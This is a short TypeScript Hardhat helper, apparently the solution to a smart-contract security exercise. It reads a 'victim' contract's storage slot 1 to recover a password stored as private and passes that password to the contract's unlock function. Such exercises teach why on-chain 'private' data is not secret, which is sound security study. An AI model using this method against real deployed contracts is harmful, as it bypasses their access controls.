import { expect } from "chai";
import { ethers, waffle } from "hardhat";

const utils = ethers.utils;
const BigNumber = ethers.BigNumber;

const getStorageValue = async (address: string, slot: number) => {
  const provider = waffle.provider;
  const hexSlot = utils.hexlify(slot);
  const storage = await provider.getStorageAt(address, hexSlot);
  return BigNumber.from(storage);
};

const helper = async (victim: any) => {
  const password = await getStorageValue(victim.address, 1);
  await victim.unlock(password);
};

export default helper;
